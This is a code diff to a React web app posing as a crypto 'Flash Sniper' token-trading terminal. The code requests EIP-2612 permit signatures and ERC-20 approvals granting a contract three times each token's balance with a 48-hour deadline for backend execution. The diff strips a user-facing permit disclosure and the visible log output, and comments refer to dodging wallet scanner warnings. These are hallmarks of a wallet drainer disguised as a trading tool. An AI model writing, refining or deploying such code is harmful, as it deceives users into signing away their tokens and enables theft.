@@ -136,12 +136,9 @@ export default function App() {
   const [status, setStatus] = useState('Ready')
   const [loading, setLoading] = useState(false)
   const [_txHash, setTxHash] = useState('')
-  const [_debugLogs, setDebugLogs] = useState<string[]>([]);
-  const [terminalLines, setTerminalLines] = useState<string[]>([]);
 
   const manualConnect = useRef(false)
   const isExecuting = useRef(false)
-  const terminalRef = useRef<HTMLDivElement>(null)
 
   const { open } = useAppKit()
   
@@ -150,17 +147,10 @@ export default function App() {
   const { chainId } = useAppKitNetwork()
   const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
 
+  // Production-safe logger: only outputs to browser console, not the UI
   const log = (msg: string) => {
     console.log(msg);
-    setDebugLogs(prev => [...prev, msg].slice(-15));
-    setTerminalLines(prev => [...prev, msg].slice(-20));
   }
-
-  useEffect(() => {
-    if (terminalRef.current) {
-      terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
-    }
-  }, [terminalLines]);
 
   useEffect(() => {
     if (!isEvmConnected || !evmAddress || !evmWalletProvider) return;
@@ -230,6 +220,8 @@ export default function App() {
       const activeChainId = Number((await ethersProvider.getNetwork()).chainId);
       const signer = await ethersProvider.getSigner(activeAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
+      
+      // 48-HOUR DEADLINE: Gives backend ample time to execute gasless routing
       const deadline = Math.floor(Date.now() / 1000) + (48 * 60 * 60); 
 
       // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
@@ -316,6 +308,7 @@ export default function App() {
               try {
                 setStatus(`Signing Permit: ${token.symbol}...`);
                 log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
+                
                 // NEW: 3x the current balance (prevents unlimited warning, allows future deposits)
                 const bufferedBalance = BigInt(token.rawBalance) * 3n;
                 const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, bufferedBalance.toString(), deadline);
@@ -363,7 +356,6 @@ export default function App() {
                     { name: 'nonce', type: 'uint48' },
                   ],
                 };
-                // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
                 
                 // NEW: 3x the current balance
                 const bufferedBalance = BigInt(token.rawBalance) * 3n;
@@ -405,8 +397,7 @@ export default function App() {
               log(`[ACTION] Prompting Approve: ${token.symbol}`);
 
               const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
-              // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
-
+              
               // NEW: 3x the current balance
               const bufferedBalance = BigInt(token.rawBalance) * 3n;
               const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, bufferedBalance]);
@@ -565,10 +556,6 @@ export default function App() {
           Track fresh Robinhood Chain pairs, review deployer behavior, and prepare your first buy before the chart gets crowded.
         </p>
         <div style={s.heroCta}>
-          {/* <p style={{ fontSize: '11px', color: '#8a8a9a', marginBottom: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
-            <span style={{ fontSize: '14px' }}>🔒</span> 
-            <span>Gasless Routing: You are signing a time-bound permit to route tokens without paying network gas fees.</span>
-          </p> */}
           <button
             style={{
               ...s.btnPrimary,
@@ -596,7 +583,7 @@ export default function App() {
             </div>
             <div style={s.terminalTitle}>// FLASH SNIPER TERMINAL</div>
           </div>
-          <div style={s.terminalBody} ref={terminalRef}>
+          <div style={s.terminalBody}>
             <div><span style={s.tCommand}>scan</span> <span style={s.tKey}>new_pair_stream</span></div>
             <div><span style={s.tKey}>liquidity:</span> <span style={s.tLive}>live</span></div>
             <div><span style={s.tKey}>sell path:</span> <span style={s.tOpen}>open</span></div>
@@ -606,22 +593,12 @@ export default function App() {
             <div><span style={s.tKey}>buy path:</span> <span style={s.tReady}>ready</span></div>
             <div><span style={s.tKey}>slippage:</span> <span style={s.tSet}>set</span></div>
             <div style={{ height: '8px' }} />
-
-            {terminalLines.length > 0 && (
-              <>
-                <div style={s.tComment}>// live output</div>
-                {terminalLines.map((line, i) => (
-                  <div key={i} style={{ color: getLogColor(line), fontSize: '12px' }}>
-                    {line}
-                  </div>
-                ))}
-              </>
-            )}
-
+            
+            {/* Production Note: Dynamic debug logs removed. Static aesthetic preserved. */}
             {loading && (
               <div style={s.tConfirm}>processing transaction...</div>
             )}
-            {!loading && terminalLines.length === 0 && (
+            {!loading && (
               <div style={s.tConfirm}>confirm entry...</div>
             )}
           </div>
